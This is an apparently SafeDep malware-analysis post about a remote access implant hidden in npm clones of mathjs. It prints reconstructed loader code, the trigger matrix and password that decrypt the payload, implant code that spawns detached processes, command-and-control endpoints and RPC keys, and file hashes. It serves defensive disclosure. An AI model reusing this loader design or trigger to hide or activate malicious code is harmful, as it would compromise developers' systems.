@@ -1,0 +1,370 @@
+<div id="readability-page-1" class="page"><div> <p>We found a remote access implant hidden inside <code><a href="https://safedep.io/cdn-cgi/l/email-protection" data-cfemail="ff929e8b97929e9691bfced1cfd1cf">[email&nbsp;protected]</a></code>, an npm package that copies the popular <code>mathjs</code> library. The malicious code ships encrypted. A caller activates the loader with matrix data that produces a specific password. When the key matches, the package decrypts a payload and runs it. The implant receives encrypted code from an operator and starts it on the host. It uses a public chat service and a blockchain network for its command channel. This post shows how we found the loader, how we decrypted it, what the payload does, and the indicators you can use to find it.</p>
+<p>We started with a <a href="https://app.safedep.io/community/malysis/01M2Q39B7G9RZSKZ16EZEGBB14">SafeDep analysis of <code>mathmain</code></a> on September 17, 2026. The package looked like a copy of <code>mathjs</code> with a different name and obfuscated code. One added call in the solver led us to the loader.</p>
+<h2 id="a-solver-calls-a-type-check">A solver calls a type check</h2>
+<p>Near the end of <code>lusolve()</code>, we found an extra call in the CommonJS build. The solver had already calculated its result. It then passed data from the lower triangular matrix to <code>removeSolveValidation()</code>:</p>
+<div><figure><pre data-language="javascript"><code><div><p><span>// Readable reconstruction: recovered strings and renamed local variables.</span></p></div><div><p><span>l </span><span>&amp;&amp;</span><span> (q </span><span>=</span><span> </span><span>removeSolveValidation</span><span>(l._data));</span></p></div><div><p><span>return</span><span> x;</span></p></div></code></pre></figure></div>
+<p>Here, <code>l</code> holds the lower triangular matrix and <code>x</code> holds the result. The solver returns <code>x</code> unchanged. It assigns the extra call’s return value to <code>q</code>, but does not use <code>q</code> again.</p>
+<p>We followed <code>removeSolveValidation()</code> to <code>isGraph(x)</code> in <code>lib/cjs/utils/is.js</code>. This file contains checks such as <code>isMatrix</code> and <code>isNumber</code>. The added <code>isGraph()</code> function decrypts and loads code:</p>
+<div><figure><pre data-language="javascript"><code><div><p><span>// Readable reconstruction: recovered strings and renamed local variables.</span></p></div><div><p><span>const</span><span> </span><span>STAGE1_BLOB</span><span> </span><span>=</span><span> </span><span>'IapMCmvlemBnFaU+3GZ4oF2xOhnczTlDWTO3oCfrHkWp1lSpHdCaeG0qn2neIoTetyRJtQ=='</span><span>;</span></p></div><div><p><span>function</span><span> </span><span>isGraph</span><span>(</span><span>x</span><span>) {</span></p></div><div><p><span>  </span><span>const</span><span> </span><span>name</span><span> </span><span>=</span><span> </span><span>validEvent</span><span>(</span><span>STAGE1_BLOB</span><span>, </span><span>JSON</span><span>.</span><span>stringify</span><span>(x));</span></p></div><div><p><span>  </span><span>const</span><span> </span><span>target</span><span> </span><span>=</span><span> path.</span><span>join</span><span>(__dirname, name);</span></p></div><div><p><span>  </span><span>const</span><span> </span><span>mod</span><span> </span><span>=</span><span> </span><span>require</span><span>(</span><span>event</span><span>(target, </span><span>JSON</span><span>.</span><span>stringify</span><span>(x)));</span></p></div><div><p><span>  </span><span>return</span><span> (x </span><span>&amp;&amp;</span><span> mod.</span><span>validGraph</span><span>(</span><span>JSON</span><span>.</span><span>stringify</span><span>(x))) </span><span>||</span><span> </span><span>false</span><span>;</span></p></div><div><p><span>}</span></p></div></code></pre></figure></div>
+<p><code>isGraph()</code> converts its input to a JSON string and uses that string as a password. It first decrypts a filename. It then passes the file path and password to <code>event()</code>, and loads the returned path with <code>require()</code>.</p>
+<p>We have made the loader snippets easier to read by restoring strings and renaming local variables. The hashes at the end of this post identify the original files.</p>
+<h2 id="the-matrix-data-becomes-a-password">The matrix data becomes a password</h2>
+<p>In <code>lib/cjs/utils/event.js</code>, we found the decryption functions. They use <code>scrypt</code> to turn the password into a key of 256 bits. They then decrypt the data with Advanced Encryption Standard in Galois/Counter Mode (AES-GCM):</p>
+<div><figure><pre data-language="javascript"><code><div><p><span>// Readable reconstruction: recovered strings and renamed local variables.</span></p></div><div><p><span>const</span><span> </span><span>key</span><span> </span><span>=</span><span> crypto.</span><span>scryptSync</span><span>(password, salt, </span><span>32</span><span>);</span></p></div><div><p><span>const</span><span> </span><span>decipher</span><span> </span><span>=</span><span> crypto.</span><span>createDecipheriv</span><span>(</span><span>'aes-256-gcm'</span><span>, key, iv);</span></p></div><div><p><span>decipher.</span><span>setAuthTag</span><span>(tag);</span></p></div><div><p><span>return</span><span> Buffer.</span><span>concat</span><span>([decipher.</span><span>update</span><span>(ciphertext), decipher.</span><span>final</span><span>()]);</span></p></div></code></pre></figure></div>
+<p>The encrypted data has a fixed layout: a salt of 16 bytes, an initialization vector of 12 bytes, and an authentication tag of 16 bytes. The ciphertext follows these fields. The package stores the whole sequence as base64 text.</p>
+<p>For calls through the solver, the password is <code>JSON.stringify(L._data)</code>. A caller can supply <code>L</code> through the object form of <code>lusolve()</code>. So the caller must pass matrix data that produces the correct password. We found no password stored in the visible loader.</p>
+<p>The encrypted filename has eight bytes of ciphertext. We first suspected <code>graph.js</code>, a file beside the loader whose name also takes eight bytes. The decryption described below confirmed that filename.</p>
+<h2 id="the-loader-writes-and-runs-the-file">The loader writes and runs the file</h2>
+<p>On success, the <code>event()</code> helper decrypts the file, writes the result to disk, and returns the output path:</p>
+<div><figure><pre data-language="javascript"><code><div><p><span>// Readable reconstruction: recovered strings and renamed local variables.</span></p></div><div><p><span>const</span><span> </span><span>plaintext</span><span> </span><span>=</span><span> </span><span>eventEmitter</span><span>(file, password);</span></p></div><div><p><span>const</span><span> </span><span>dir</span><span> </span><span>=</span><span> path.</span><span>dirname</span><span>(path.</span><span>resolve</span><span>(file));</span></p></div><div><p><span>const</span><span> </span><span>base</span><span> </span><span>=</span><span> path.</span><span>basename</span><span>(file).</span><span>replace</span><span>(</span><span>/</span><span>^</span><span>enc_</span><span>/</span><span>, </span><span>''</span><span>);</span></p></div><div><p><span>const</span><span> </span><span>outPath</span><span> </span><span>=</span><span> path.</span><span>join</span><span>(dir, base);</span></p></div><div><p><span>fs.</span><span>writeFileSync</span><span>(outPath, plaintext);</span></p></div><div><p><span>return</span><span> outPath;</span></p></div></code></pre></figure></div>
+<p>If decryption or writing fails, <code>event()</code> catches the error and returns the original path.</p>
+<p>If the filename has no <code>enc_</code> prefix, the helper overwrites the encrypted file with the decrypted code. The <code>require()</code> call in <code>isGraph()</code> then loads it. That code would run with the same permissions as the Node.js process.</p>
+<p>Three added files contain base64 data instead of normal JavaScript:</p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div><table><thead><tr><th>Path under <code>lib/cjs/utils/</code></th><th>Size of ciphertext in bytes</th></tr></thead><tbody><tr><td><code>graph.js</code></td><td>20,918</td></tr><tr><td><code>fraction.js</code></td><td>9,084</td></tr><tr><td><code>bignumber/type.js</code></td><td>1,179,416</td></tr></tbody></table></div>
+<p>We found no reference to the last two files in the visible loader. The decrypted <code>graph.js</code> loads them as later stages, as the payload section shows.</p>
+<p>We found no install hooks in the manifest. Importing the package through the path we reviewed does not activate the loader either. The solver must first pass its validation and calculation steps to reach the added call. If the password is wrong, <code>validEvent()</code> fails its authentication check before the helper writes any file.</p>
+<h2 id="the-same-loader-appears-in-two-more-packages">The same loader appears in two more packages</h2>
+<p>We searched the npm registry and found two more packages: <code>mathsbase</code> and <code>math-universe</code>. Across five versions, we found identical loader files, trigger code, solver changes, and two large encrypted files.</p>
+<p>The encrypted <code>graph.js</code> in <code><a href="https://safedep.io/cdn-cgi/l/email-protection" data-cfemail="6d000c19051e0f0c1e082d5c435d435c">[email&nbsp;protected]</a></code> differs from the other copies. The shared files connect these releases. They do not tell us who added the loader or whether someone took over a publisher’s account.</p>
+<p>On September 17, npm served <code><a href="https://safedep.io/cdn-cgi/l/email-protection" data-cfemail="553834213d263734263015647b657b67">[email&nbsp;protected]</a></code> as the default release. That version did not contain this loader. Checking only the default version would have missed the code in <code>1.0.1</code>.</p>
+<p>On September 19, we checked npm’s download counts for all three packages. These totals cover September 12–18, 2026, across all versions of each package.</p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div><table><thead><tr><th>Package</th><th>Reported downloads</th></tr></thead><tbody><tr><td><a href="https://api.npmjs.org/downloads/point/2026-09-12:2026-09-18/mathmain"><code>mathmain</code></a></td><td>605,157</td></tr><tr><td><a href="https://api.npmjs.org/downloads/point/2026-09-12:2026-09-18/mathsbase"><code>mathsbase</code></a></td><td>1,923,059</td></tr><tr><td><a href="https://api.npmjs.org/downloads/point/2026-09-12:2026-09-18/math-universe"><code>math-universe</code></a></td><td>569,730</td></tr></tbody></table></div>
+<p>npm also reported <a href="https://api.npmjs.org/downloads/range/2026-09-17:2026-09-18">zero downloads across the entire registry for September 17</a>. This makes the earlier zero for <code>mathmain</code> unreliable. Our public dependency searches found no consumers within their coverage. Our saved download statistics do not identify who generated the traffic. These counts do not tell us how many systems installed the packages or whether the encrypted code ran.</p>
+<h2 id="the-loader-is-not-in-the-github-source">The loader is not in the GitHub source</h2>
+<p>The <code>mathsbase</code> and <code>math-universe</code> packages each link to a public GitHub repository. We read both. Neither reviewed commit contains the loader:</p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div><table><thead><tr><th>Repository</th><th>Reviewed commit</th></tr></thead><tbody><tr><td><code>github[.]com/tinystar8/mathsbase</code></td><td><code>560d97e66140dbf817e04284a7a0c58757d1202e</code></td></tr><tr><td><code>github[.]com/mathubio/math-universe</code></td><td><code>da99dd46501c75ba6102a51ef60ebb922174da32</code></td></tr></tbody></table></div>
+<p>The public <code>math-universe</code> source ends its solver like this:</p>
+<div><figure><pre data-language="javascript"><code><div><p><span>// mathubio/math-universe, commit da99dd46501c75ba6102a51ef60ebb922174da32</span></p></div><div><p><span>// src/function/algebra/solver/lusolve.js; original source excerpt.</span></p></div><div><p><span>if</span><span> (q) {</span></p></div><div><p><span><span>  </span></span><span>x._data </span><span>=</span><span> </span><span>csIpvec</span><span>(q, x._data);</span></p></div><div><p><span>}</span></p></div><div><p><span>return</span><span> x;</span></p></div></code></pre></figure></div>
+<p>The extra <code>removeSolveValidation()</code> call is not there. The npm build has it. The reviewed GitHub source does not. This difference does not establish when or how someone inserted the loader into the npm build.</p>
+<p>We also looked for a program that calls the solver with the trigger. We searched GitHub code, lockfiles, and dependency services. We found none. Private projects, and code that search engines miss, stay out of reach.</p>
+<h2 id="our-first-attempts-did-not-find-the-password">Our first attempts did not find the password</h2>
+<p>We tested 16,922 possible passwords against the encrypted filename. Some came from matrices with zero diagonal entries, which our earlier search had left out.</p>
+<p>In a second search, we tested 533 possible passwords against all five distinct encrypted blobs, including the older <code>graph.js</code>. We tried common passwords and numeric arrays from the solver’s tests. Neither search found a password that passed the authentication check.</p>
+<p>Some passwords appeared in both searches.</p>
+<p>We checked the tools with test data and known passwords. The searches finished. None of our guesses worked. The successful password was outside the candidates we tested.</p>
+<h2 id="cracking-the-encryption">Cracking the encryption</h2>
+<p>The password is the JSON form of a matrix lower factor <code>L</code>. JFrog first <a href="https://research.jfrog.com/post/equation-of-compromise/">reported</a> the input that produces it. We then reproduced the result against the <code>mathmain</code> files.</p>
+<p>The recovered trigger is a 3 by 3 Pascal matrix.</p>
+<div><figure><pre data-language="text"><code><div><p><span>A = [[1, 1, 1],</span></p></div><div><p><span><span>     </span></span><span>[1, 2, 3],</span></p></div><div><p><span><span>     </span></span><span>[1, 3, 6]]</span></p></div></code></pre></figure></div>
+<p>A caller passes <code>A</code> to <code>lusolve()</code>. The solver runs an LU decomposition of <code>A</code>. The lower triangular factor <code>L</code> becomes <code>[[1, 0, 0], [1, 1, 0], [1, 0.5, 1]]</code>. The loader turns <code>L</code> into a JSON string. That string is the password.</p>
+<p>We confirmed this against the real files. The password is the JSON form of <code>L</code>.</p>
+<div><figure><pre data-language="javascript"><code><div><div><p><span>// SafeDep reproduction against <a href="https://safedep.io/cdn-cgi/l/email-protection" data-cfemail="7d101c0915101c14133d4c534d534d">[email&nbsp;protected]</a>.</span></p></div></div><div><p><span>const</span><span> </span><span>A</span><span> </span><span>=</span><span> [</span></p></div><div><p><span><span>  </span></span><span>[</span><span>1</span><span>, </span><span>1</span><span>, </span><span>1</span><span>],</span></p></div><div><p><span><span>  </span></span><span>[</span><span>1</span><span>, </span><span>2</span><span>, </span><span>3</span><span>],</span></p></div><div><p><span><span>  </span></span><span>[</span><span>1</span><span>, </span><span>3</span><span>, </span><span>6</span><span>],</span></p></div><div><p><span>];</span></p></div><div><p><span>const</span><span> </span><span>L</span><span> </span><span>=</span><span> </span><span>lup</span><span>(</span><span>A</span><span>).</span><span>L</span><span>.</span><span>valueOf</span><span>(); </span><span>// [[1,0,0],[1,1,0],[1,0.5,1]]</span></p></div><div><p><span>const</span><span> </span><span>password</span><span> </span><span>=</span><span> </span><span>JSON</span><span>.</span><span>stringify</span><span>(</span><span>L</span><span>); </span><span>// '[[1,0,0],[1,1,0],[1,0.5,1]]'</span></p></div><div><p><span>const</span><span> </span><span>blob</span><span> </span><span>=</span><span> Buffer.</span><span>from</span><span>(</span><span>STAGE1_BLOB</span><span>, </span><span>'base64'</span><span>);</span></p></div><div><p><span>const</span><span> </span><span>key</span><span> </span><span>=</span><span> crypto.</span><span>scryptSync</span><span>(password, blob.</span><span>subarray</span><span>(</span><span>0</span><span>, </span><span>16</span><span>), </span><span>32</span><span>);</span></p></div><div><p><span>const</span><span> </span><span>d</span><span> </span><span>=</span><span> crypto.</span><span>createDecipheriv</span><span>(</span><span>'aes-256-gcm'</span><span>, key, blob.</span><span>subarray</span><span>(</span><span>16</span><span>, </span><span>28</span><span>));</span></p></div><div><p><span>d.</span><span>setAuthTag</span><span>(blob.</span><span>subarray</span><span>(</span><span>28</span><span>, </span><span>44</span><span>));</span></p></div><div><p><span>const</span><span> </span><span>name</span><span> </span><span>=</span><span> Buffer.</span><span>concat</span><span>([d.</span><span>update</span><span>(blob.</span><span>subarray</span><span>(</span><span>44</span><span>)), d.</span><span>final</span><span>()]).</span><span>toString</span><span>();</span></p></div><div><p><span>// name === 'graph.js'</span></p></div></code></pre></figure></div>
+<p>The password decrypted the filename to <code>graph.js</code>. It also decrypted the three payload files in <code>mathmain</code> and in <code>math-universe</code>. The <code>mathmain</code> payload matches the <code>math-universe</code> payload byte for byte. <code><a href="https://safedep.io/cdn-cgi/l/email-protection" data-cfemail="026f63766a716063716742332c322c33">[email&nbsp;protected]</a></code> uses the same password with different encrypted data. So the same password unlocks the whole family.</p>
+<h2 id="payload-analysis">Payload analysis</h2>
+<p>The decrypted files form a small remote access implant. Each file has one job. The findings below come from our own static review of the decrypted code.</p>
+<p>The decrypted <code>graph.js</code> is the first stage. The loader runs it with <code>require()</code> after decryption. It reads host data with <code>os</code> and <code>fs</code>. It generates an X25519 key pair with the Node <code>crypto</code> module through <code>generateKeyPairSync</code> and <code>diffieHellman</code>. It uses <code>child_process</code> to start detached Node.js processes and manage child processes. It reads a smart contract on the Base Sepolia test network with a bundled copy of <code>ethers</code>. It reports to Slack <code>chat.postMessage</code> and to <code>api.telegram.org</code>. It then loads <code>bignumber/type.js</code> and <code>fraction.js</code> as later stages. The network details sit in the file as base64 text.</p>
+<div><figure><pre data-language="text"><code><div><div><p><span># Decoded constants from decrypted graph.js (<a href="https://safedep.io/cdn-cgi/l/email-protection" data-cfemail="701d1104181d11191e30415e405e40">[email&nbsp;protected]</a>).</span></p></div></div><div><p><span>Base Sepolia contract   0xac0bfC4C48A679b667732128278EACBA1c191894</span></p></div><div><p><span>RPC (Infura)            base-sepolia.infura[.]io/v3/dc7257d09fab42eca2c354c32fec1938</span></p></div><div><p><span>RPC (Alchemy)           base-sepolia.g.alchemy[.]com/v2/D2-TbkB2m05WXSnSDOCDI</span></p></div><div><p><span>Telegram bot            8961878831:AAG4... (secret redacted)</span></p></div><div><p><span>Slack bot               xoxb-11307403103236-11289767127959-... (secret redacted)</span></p></div></code></pre></figure></div>
+<p>The decrypted <code>bignumber/type.js</code> is a copy of the <code>ethers</code> library. The file carries the marker <code>ethers/5.7.2</code> and the <code>JsonRpcProvider</code> and <code>secp256k1</code> symbols. The implant uses this library to read the smart contract.</p>
+<p>The decrypted <code>fraction.js</code> is the Slack agent. It reads <code>CHAT_PASSWORD</code> from <code>process.argv[2]</code>, the parent process ID from <code>process.argv[3]</code>, and the trigger password from <code>process.argv[4]</code>. The parent supplies these arguments when it starts the agent. <code>CHAT_PASSWORD</code> is a shared secret derived with X25519. The agent uses the trigger password to decrypt its Slack bot token and channel ID.</p>
+<div><figure><pre data-language="javascript"><code><div><p><span>// Decrypted lib/cjs/utils/fraction.js; recovered strings, original identifiers.</span></p></div><div><p><span>const</span><span> </span><span>CHAT_PASSWORD</span><span> </span><span>=</span><span> process[</span><span>'argv'</span><span>][</span><span>0x2</span><span>],</span></p></div><div><p><span>  </span><span>PARENT_PID</span><span> </span><span>=</span><span> </span><span>Number</span><span>(process[</span><span>'argv'</span><span>][</span><span>0x3</span><span>]);</span></p></div></code></pre></figure></div>
+<p>The agent polls Slack’s <code>conversations.history</code> endpoint every 10 seconds. It checks sender identifiers and decrypts accepted message text into JSON packets. A start packet opens a transfer, chunk packets supply file content, and an end packet joins the chunks. The agent writes the result to <code>lib/cjs/utils/subwatcher</code> and starts it with Node.js:</p>
+<div><figure><pre data-language="javascript"><code><div><p><span>// Decrypted lib/cjs/utils/fraction.js; recovered strings, original identifiers.</span></p></div><div><p><span>function</span><span> </span><span>runProcess</span><span>(</span><span>_0x490de7</span><span>) {</span></p></div><div><p><span><span>  </span></span><span>console[</span><span>'log'</span><span>](_0x490de7);</span></p></div><div><p><span>  </span><span>const</span><span> </span><span>_0x1335c7</span><span> </span><span>=</span><span> </span><span>spawn</span><span>(process[</span><span>'execPath'</span><span>], [_0x490de7], {</span></p></div><div><p><span><span>    </span></span><span>detached: </span><span>!!</span><span>[],</span></p></div><div><p><span><span>    </span></span><span>stdio: </span><span>'ignore'</span><span>,</span></p></div><div><p><span><span>    </span></span><span>windowsHide: </span><span>!!</span><span>[],</span></p></div><div><p><span><span>  </span></span><span>});</span></p></div><div><p><span><span>  </span></span><span>_0x1335c7[</span><span>'unref'</span><span>]();</span></p></div><div><p><span>}</span></p></div></code></pre></figure></div>
+<p>The blockchain path also decrypts remote data, writes <code>subwatcher</code>, and starts it with Node.js. These paths let an operator deliver code for execution on a host where the required setup succeeds. We recovered the implant, but not the later code delivered through these channels. We therefore cannot say what tasks an operator ran on a victim.</p>
+<h2 id="how-the-trigger-reaches-a-victim">How the trigger reaches a victim</h2>
+<p>The loader stays inert until a caller runs the solver with an input that produces the factor <code>L</code>. A normal import does not reach the added code. If a call reaches the loader with the wrong password, the filename authentication check fails before any payload write. The password is the JSON form of <code>L</code>, so the Pascal matrix is not the only trigger. A caller can pass <code>L</code> as the coefficient matrix, because its own lower factor is <code>L</code> again. A caller can also supply <code>L</code> through the object form of <code>lusolve()</code>. Both inputs give the same password.</p>
+<p>The package holds the encrypted implant. A second package or another caller could supply the trigger matrix. This is a possible delivery path; we have not found the caller used in an attack.</p>
+<p>We did not find that caller in public code. Our GitHub and dependency searches returned no project that calls the solver with the trigger. Private code and removed projects stay outside that search.</p>
+<h2 id="investigation-timeline">Investigation timeline</h2>
+<p>All times are in Coordinated Universal Time (UTC). We took publication times from the npm registry metadata.</p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div><table><thead><tr><th>Date and time</th><th>Event</th></tr></thead><tbody><tr><td>August 26, 2026, 08:14</td><td><code><a href="https://safedep.io/cdn-cgi/l/email-protection" data-cfemail="fc919d88948f9e9d8f99bccdd2ccd2cc">[email&nbsp;protected]</a></code> published. No matching loader found.</td></tr><tr><td>August 27, 2026, 07:44</td><td><code><a href="https://safedep.io/cdn-cgi/l/email-protection" data-cfemail="f59894819d8697948690b5c4dbc5dbc4">[email&nbsp;protected]</a></code> published with the loader and encrypted files.</td></tr><tr><td>September 15, 2026, 03:38</td><td><code><a href="https://safedep.io/cdn-cgi/l/email-protection" data-cfemail="335e52475b405152405673021d031d01">[email&nbsp;protected]</a></code> published without the matching loader.</td></tr><tr><td>September 16, 2026, 12:06</td><td><code><a href="https://safedep.io/cdn-cgi/l/email-protection" data-cfemail="e885899c80c59d86819e8d9a9b8da8d9c6d8c6d8">[email&nbsp;protected]</a></code> published with the loader.</td></tr><tr><td>September 16, 2026, 13:39</td><td><code><a href="https://safedep.io/cdn-cgi/l/email-protection" data-cfemail="6e030f1a06431b0007180b1c1d0b2e5f405e405c">[email&nbsp;protected]</a></code> published with the loader.</td></tr><tr><td>September 16, 2026, 14:14</td><td><code><a href="https://safedep.io/cdn-cgi/l/email-protection" data-cfemail="d5b8b4a1bdf8a0bbbca3b0a7a6b095e4fbe5fbe4">[email&nbsp;protected]</a></code> published with the loader, after <code>1.0.2</code>.</td></tr><tr><td>September 17, 2026, 06:53</td><td><code><a href="https://safedep.io/cdn-cgi/l/email-protection" data-cfemail="e28f83968a8f838b8ca2d3ccd2ccd2">[email&nbsp;protected]</a></code> published with matching files.</td></tr><tr><td>September 17, 2026</td><td>Source review, consumer searches, and further decryption attempts completed. No plaintext recovered.</td></tr><tr><td>September 19, 2026</td><td>npm reported 605,157 downloads of <code>mathmain</code> for September 18.</td></tr><tr><td>September 21, 2026</td><td>JFrog published its analysis. It recovered the trigger matrix.</td></tr><tr><td>September 21, 2026</td><td>SafeDep reproduced the decryption and read the <code>mathmain</code> payload.</td></tr></tbody></table></div>
+<h2 id="indicators-of-compromise">Indicators of compromise</h2>
+<p>Use these indicators to find the packages, the loader, and the decrypted implant. A match on a package or a hash does not prove the code ran on a host. A caller must first trigger the loader.</p>
+<h3 id="malicious-packages">Malicious packages</h3>
+<p>SafeDep analyzed the loader in these versions. The archive SHA-256 comes from the npm tarball.</p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div><table><thead><tr><th>npm package version</th><th>Archive SHA-256</th></tr></thead><tbody><tr><td><code><a href="https://safedep.io/cdn-cgi/l/email-protection" data-cfemail="345955405c59555d5a74051a041a04">[email&nbsp;protected]</a></code></td><td><code>1723a0df210ac61281a504f3a07ec3605d20151631e0635cc344cacc71019135</code></td></tr><tr><td><code><a href="https://safedep.io/cdn-cgi/l/email-protection" data-cfemail="224f43564a514043514762130c120c13">[email&nbsp;protected]</a></code></td><td><code>03e13cdedd9c33e6fed25092b1ec7dcf11cc5962c0fbb6b3e90ba95bfec1b034</code></td></tr><tr><td><code><a href="https://safedep.io/cdn-cgi/l/email-protection" data-cfemail="345955405c19415a5d425146475174051a041a04">[email&nbsp;protected]</a></code></td><td><code>7e5e1bcdc6a7b0e3437269a236b49ef2be4f77081c7de5130d503c103fd6be69</code></td></tr><tr><td><code><a href="https://safedep.io/cdn-cgi/l/email-protection" data-cfemail="96fbf7e2febbe3f8ffe0f3e4e5f3d6a7b8a6b8a7">[email&nbsp;protected]</a></code></td><td><code>bfe772e7ee044fd6f0bdf53e83f44aad7c9ee1925baf0cf4d884a312aa9ba50e</code></td></tr><tr><td><code><a href="https://safedep.io/cdn-cgi/l/email-protection" data-cfemail="0a676b7e62277f64637c6f78796f4a3b243a2438">[email&nbsp;protected]</a></code></td><td><code>4eb1d59df7dc80dbe3ec154481e61e8824422037092c188f0cc146b543615a66</code></td></tr></tbody></table></div>
+<h3 id="the-trigger-and-the-password">The trigger and the password</h3>
+<p>A caller activates the loader with one matrix. The password is the JSON form of that matrix LU lower factor.</p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div><table><thead><tr><th>Item</th><th>Value</th></tr></thead><tbody><tr><td>Trigger matrix</td><td><code>[[1,1,1],[1,2,3],[1,3,6]]</code></td></tr><tr><td>Password</td><td><code>[[1,0,0],[1,1,0],[1,0.5,1]]</code></td></tr><tr><td>Stage-1 blob</td><td><code>IapMCmvlemBnFaU+3GZ4oF2xOhnczTlDWTO3oCfrHkWp1lSpHdCaeG0qn2neIoTetyRJtQ==</code></td></tr></tbody></table></div>
+<h3 id="loader-files">Loader files</h3>
+<p>These two file hashes match across the five versions listed above.</p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div><table><thead><tr><th>File</th><th>SHA-256</th></tr></thead><tbody><tr><td><code>lib/cjs/utils/event.js</code></td><td><code>ab66c98e8ed5235feb963ec8845765f62f5f26b1c58c266c409767e53bcb5ccd</code></td></tr><tr><td><code>lib/cjs/utils/is.js</code></td><td><code>5d9e952c51875d2b897eedc22b002b94ab21c8004d513bc99ce3a885f8a01dae</code></td></tr></tbody></table></div>
+<h3 id="encrypted-payload-files">Encrypted payload files</h3>
+<p>The base64 blobs sit under <code>lib/cjs/utils/</code>. <code><a href="https://safedep.io/cdn-cgi/l/email-protection" data-cfemail="375a56435f5a565e59770619071907">[email&nbsp;protected]</a></code> and the three <code>math-universe</code> versions share one set. <code><a href="https://safedep.io/cdn-cgi/l/email-protection" data-cfemail="1d707c69756e7f7c6e785d2c332d332c">[email&nbsp;protected]</a></code> ships a different <code>graph.js</code> blob.</p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div><table><thead><tr><th>File</th><th>SHA-256</th><th>Deployment</th></tr></thead><tbody><tr><td><code>graph.js</code></td><td><code>ed9b078594393d09d91ee008366ca75e3017cca18c79af99c5b294c61db67f06</code></td><td>A</td></tr><tr><td><code>fraction.js</code></td><td><code>09773ee7db70216b778b15cfcd94cb1df8963eddd4a47b801c96f986651699e6</code></td><td>A</td></tr><tr><td><code>bignumber/type.js</code></td><td><code>ca4fe552da461fec5b51d5964d979699f06888499be442f209125853dff3e0e1</code></td><td>A</td></tr><tr><td><code>graph.js</code></td><td><code>0aa46d32e4b479cc09f97cc66a1f12ca96b0497a7eb6ffc6b46ed3ef80e3c83b</code></td><td>B</td></tr></tbody></table></div>
+<h3 id="decrypted-payload-files">Decrypted payload files</h3>
+<p>These hashes cover the plaintext we recovered from Deployment A. A host where the loader ran may hold files with these hashes on disk.</p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div><table><thead><tr><th>File</th><th>SHA-256</th></tr></thead><tbody><tr><td><code>graph.js</code></td><td><code>1e0f09c84aaf573627c003ce0f086517c3ea980cbea02f8ff918b1cc0d7e0bbb</code></td></tr><tr><td><code>fraction.js</code></td><td><code>6fd655d7196880fc5783f9dbb62b428baf220c2781970be54044376330be7af3</code></td></tr><tr><td><code>bignumber/type.js</code></td><td><code>6b1ad71bc3765dd272ea2ac63c1ea6ed97091ba0067d0b3e2294e1b34177cb25</code></td></tr></tbody></table></div>
+<h3 id="command-and-control">Command and control</h3>
+<p>We recovered these endpoints from the decrypted <code>graph.js</code> files. Deployment A covers <code>mathmain</code> and <code>math-universe</code>. Deployment B covers <code><a href="https://safedep.io/cdn-cgi/l/email-protection" data-cfemail="9df0fce9f5eefffceef8ddacb3adb3ac">[email&nbsp;protected]</a></code>. RPC means remote procedure call. We redact the secret half of the two bot tokens.</p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div><table><thead><tr><th>Deployment</th><th>Type</th><th>Value</th></tr></thead><tbody><tr><td>A</td><td>Smart contract</td><td><code>0xac0bfC4C48A679b667732128278EACBA1c191894</code> (Base Sepolia)</td></tr><tr><td>A</td><td>RPC (Infura)</td><td><code>base-sepolia.infura[.]io/v3/dc7257d09fab42eca2c354c32fec1938</code></td></tr><tr><td>A</td><td>RPC (Alchemy)</td><td><code>base-sepolia.g.alchemy[.]com/v2/D2-TbkB2m05WXSnSDOCDI</code></td></tr><tr><td>A</td><td>Telegram bot</td><td><code>8961878831</code> (token redacted)</td></tr><tr><td>A</td><td>Slack bot</td><td><code>xoxb-11307403103236-11289767127959-...</code> (secret redacted)</td></tr><tr><td>B</td><td>Smart contract</td><td><code>0xE390863Dac96a7118C71227C2b099B50cF602D31</code> (Ethereum Sepolia)</td></tr><tr><td>B</td><td>RPC (Alchemy)</td><td><code>eth-sepolia.g.alchemy[.]com/v2/D2-TbkB2m05WXSnSDOCDI</code></td></tr><tr><td>B</td><td>Slack bot</td><td><code>xoxb-11307403103236-11289767127959-...</code> (secret redacted)</td></tr></tbody></table></div>
+<p>Both deployments use the same Alchemy project key <code>D2-TbkB2m05WXSnSDOCDI</code>. This shared key links the deployments to the same Alchemy project. It does not establish the identity or number of operators.</p> </div></div>
